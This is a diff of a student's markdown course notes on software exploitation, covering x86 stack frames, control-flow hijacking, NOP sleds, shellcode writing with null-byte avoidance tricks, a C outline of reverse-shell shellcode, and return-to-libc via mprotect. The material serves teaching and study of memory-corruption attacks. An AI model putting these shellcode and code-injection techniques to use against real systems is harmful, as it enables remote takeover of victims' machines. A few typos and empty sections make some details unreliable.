@@ -1,21 +1,26 @@
 ---
 title: "Software security and exploitation notes"
-summary: "ELF • x86 • Memory • Processes"
+summary: "Control-Flow Hijacking • Code Injection • Shellcode Development"
 publishedAt: 2025-09-13
-updatedAt: 2025-09-29
+updatedAt: 2025-10-08
 tags:
 - notes
 ---
 
 ## Contents
 1. [Basic concepts](#basic-concepts) 
-    1. [ELF](#elf), [C](#c) (9/10) 
-    2. [Memory](#memory), [Processes Address Space](#process-address-space) (9/15) 
-    3. [Executing a Process](#executing-a-process), [x86](x86) (9/17)
-2. [Control-flow highjacking](#control-flow-highjacking)
-    1. [Disassembling binaries](#disassembling-binaries) (9/22)
-    3. [Reading x86 instructions](#reading-x86-instructions) (9/24)
-3. [Code injection](#code-injection)
+    - [ELF](#elf), [C language](#c) (9/10) 
+    - [Memory](#memory), [Processes address space](#process-address-space), [Executing a process](#executing-a-process) (9/15) 
+    - [x86 introduction](x86-introduction) (9/17), [x86 instructions](#x86-instructions) (9/24)
+    - [Commandline tools](#commandline-tools) (9/24)
+2. [Control-flow hijacking](#control-flow-hijacking) (9/22)
+3. [Code injection](#code-injection) (9/29)
+    - [NOP sled](nop-slide) 
+    - [jmp %esp](jmp-esp)
+4. [Shellcode development](#shellcode-development)
+    - [Shell code](#shell-code), [Writing shell code](#writing-shell-code) (10/1)
+    - [Reverse shell](#reverse-shell) (10/6)
+5. [Non-executable memory | Return-to-libc](#non-executable-memory--return-to-libc) (10/8)
 
 ## Basic concepts 
 
@@ -122,7 +127,7 @@ The INTERP statement is used to describe the bianry's dependencies in dynamicall
 
 `ld.so` is a special helper that will help load all other libraries into memory. Similar to the operating system, `ld.so` will jump to the right place in the MMAP region of memory and copy the relevant dynamically-loaded library, like `libc.so`.
 
-### x86
+### x86 introduction
 
 x86 has 8 general-purpose registers (EAX, EBX, ECX, ESI, EDI, EBP, and ESP) and two special-purpose registers (EFLAGS, EIP).
 
@@ -148,10 +153,51 @@ e.g. `mov %eax, %ebx` in AT&T syntax is `mov ebx, eax` in Intel syntax.
 
 x86 uses little-endian format, which means that the least significant byte is stored at the lowest memory address.
 
-## Control-flow highjacking
+### x86 instructions
 
-### Disassembling binaries
+The `push` instruction decrements `%esp` by 4 bytes, then copies 4 bytes of data to the address pointed to by `%esp`.
 
+The prologue starts a function. The CPU:
+
+1. Pushes the old base pointer on the stack
+2. Sets the base pointer to the current top of the stack
+3. Decrements `%esp` by the size of the data being pushed to the stack
+4. Grows the stack down to allocate 0x218 (536) bytes for local variables
+
+```
+push   %ebp
+mov    %esp,%ebp
+sub    $0x218,%esp
+```
+
+`call` changes the control flow of the program. The CPU:
+
+1. Computes the return address, or the address of the next instruction after the `call`
+2. Pushes the return address onto the stack in little endian
+3. Decrements `%esp` by the size of the data being pushed to the stack
+4. Loads `%eip` with the call target
+
+Then the next function starts a new prologue. The stack frame looks like this:
+
+![stack frame](/csci-1650/stack-frame.jpeg)
+
+Parameters and local variables are referenced relative to the base pointer `%ebp`. Positive offsets means that you are accessing parameters and negative offsets means that you are accessing local variables. For example, `-0xc(%ebp)` means that there is a local variable 12 bytes from `%ebp`.
+
+Parameters are pushed onto the stack in reverse order. For example, the `read` function takes 3 parameters: `int fd`, `void* buf`, and `size_t nbytes`. The assembly code to call `read(4, buf, 0x40)` looks like this:
+
+```
+push   $0x40
+lea    -0x18(%ebp),%eax
+push   %eax
+push   $0x0
+```
+
+`lea` is the only instruction that does not dereference the address. It just load the address it into a register.
+
+### Commandline tools
+
+`as --32 program.s -o program.o` assembles in 32-bit.  
+`cc -m32 program.c -o program` compiles in 32-bit.  
 `ldd` is a command that prints the shared libraries required by each program.  
 `objdump -d <exec>` can disassemble an executable file.
 
@@ -164,59 +210,89 @@ GDB
 3. `printf "%x\n", $ebp+0x8` can print addresses
 4. `x/x bffffdb0` can examine memory at the given address
 
-### Reading x86 instructions
+## Control-flow hijacking
 
-The `push` instruction decrements `%esp` by 4 bytes, then copies 4 bytes of data to the address pointed to by `%esp`. For example, this reads 4 bytes from address 0x8(%esp) and pushes it to the stack.
+Control-flow hijacking is the exploitation of memory vulnerabilities to change the control flow of a program. This is typically done by overwriting the return address on the stack to point to malicious code.mitigated
 
-```
-push 0x8(%ebp)
-```
-
-The `call` changes the control flow of the program. The CPU:
-
-1. Computes the return address, or the address of the next instruction after the `call`
-2. Pushes the return address onto the stack in little endian
-3. Decrements `%esp` by the size of the data being pushed to the stack
-4. Loads `%eip` with the call target
-
-```
-0x8049591  call 0x8049263 <cli_hndl>
-0x8049596  add %0x10, %esp
-```
-
-The prologue starts a function. The CPU:
-
-1. Pushes the old base pointer on the stack
-2. Decrements `%esp` by the size of the data being pushed to the stack
-3. Sets the base pointer to the current top of the stack
-4. Grows the stack down to allocate 0x218 (536) bytes for local variables
-
-```
-0x08049263 <+0>:     push   %ebp
-0x08049264 <+1>:     mov    %esp,%ebp
-0x08049266 <+3>:     sub    $0x218,%esp
-```
-
-`lea` is the only instruction that does not dereference the address. It just load the address it into a register.
-
-```
-lea -0x20c(%ebp),%eax
-```
-
-Remember that the stack grows upward. For example, the stack frame of `read(int fd, void* buf, size_t nbytes)` looks like this:
-
-```
-0x400       (length)
-0xbffffb84  (pointer to the buffer)
-0x4         (fd)
-```
-
-Parameters and local variables are referenced relative to the base pointer `%ebp`. Positive offsets means that you are accessing parameters and negative offsets means that you are accessing local variables. For example, `-0xc(%ebp)` means that there is a local variable 12 bytes from `%ebp`.
+A common technique is buffer overflow.
 
 ## Code injection
 
+Stack jitter refers to how much the stack memory location changes across instances because of environment variables placed on top. This causes problems when you hardcode addresses in the return address. 
+
+This problem can be mitigated by NOP sleds and `jmp %esp`.
+
+### NOP sleds
+
+NOP sleds are sequences of NOP instructions that slide the execution flow to the shell code. You can put the payload anywhere that fits.
+
+![nop sled diagram](/csci-1650/nop-sled.png)
+
+### jmp %esp
+
+## Shellcode development
+
+### Shell code
+
 Shell code is code that is injected into the attacker's area of control in order to exploit a memory corruption vulnerability.
 
-Reverse shell code connects back to the attacker's machine and gives the attacker a shell. Bind shell code listens on a port and gives the attacker a shell when they connect to that port.
+Reverse shell code connects back to the attacker's machine and gives the attacker a shell. Anything the attacker types is executed on the victim's machine; and anything the victim's machine outputs is sent back to the attacker.
 
-Stack jitter refers to how much the stack memory location changes across instances because of environment variables placed on top. This can be mitigated by NOP sleds, which are sequences of NOP instructions that slide the execution flow to the shell code.
+Bind shell code listens on a port and gives the attacker a shell when they connect to that port.
+
+### Writing shell code
+
+Write the assembly. Assemble it. Then disassemble it to get the opcodes. A nice one-liner is `as --32 program.s -o program && objdump -d program`. Note that `as` reads AT&T syntax.
+
+Avoid null bytes (`0x00`). They can terminate strings early in function slike `strcpy()`.
+
+Tricks to remove null bytes:
+1. Instead of `mov $0x0`, `xor` registers with themselves
+2. `pushw` can sometimes optimize out `00`. e.g. `pushw $0x0012` is `\x66\x6a\x12` instead of `\x66\x6a\x12\x00`. This wroks for values up to `7f`.
+3. Becauseu `/bin/sh` is 7 bytes, there will be a null byte at the end. You can instead push `/bin//sh`.
+
+It might also be necessary to reduce payload size. 
+
+Tricks to reduce shell code size:
+3. In `mov`, use the lowest register necessary
+
+
+Each system call has a mapping between its arguments and registers. To make a system call, put its syscall number in `%eax` and its arguments in the appropriate registers. Then invoke `int $0x80`. The return value will be in `%eax`.
+
+### Reverse shell
+
+On the compromised machine, the shell code will:
+1. Create a socket
+2. Change stdin, stdout, and stderr to the socket
+3. Connect to the attacker's machine
+4. Execute `/bin/sh`
+
+```c
+sfd = socket(PF_INIT, SOCK_STREAM, 0);
+dup2(sfd, 2); // stderr
+dup2(sfd, 1); // stdout
+dup2(sfd, 0); // stdin
+connect(sfd, &sin, sizeof(sin));
+execve("/bin/sh", NULL, NULL);
+```
+
+## Non-executable memory | Return-to-libc
+
+Pages have three permission bits: 
+- Present (P)
+- Read/write (R/W)
+- Executable (X)
+
+These permission bits are enforced by the CPU.
+
+Only the text section should be marked as executable, and everything else should be marked as non-executable. This prevents the injected code on the stack from being executed. 
+
+Since we can no longer do code injection, there is a new family of exploits called **code reuse**.
+
+In `libc`, there is a function called `mprotect` that can set the protection on a region of memory. Thus, we can
+1. Add parameters for `mprotect` to make the stack executable
+2. Add shell code where `mprotect` will return 
+3. Hijack the control flow to `mprotect` 
+
+References:
+1. [Linux System Call Table](https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls/#x86_64-64-bit)
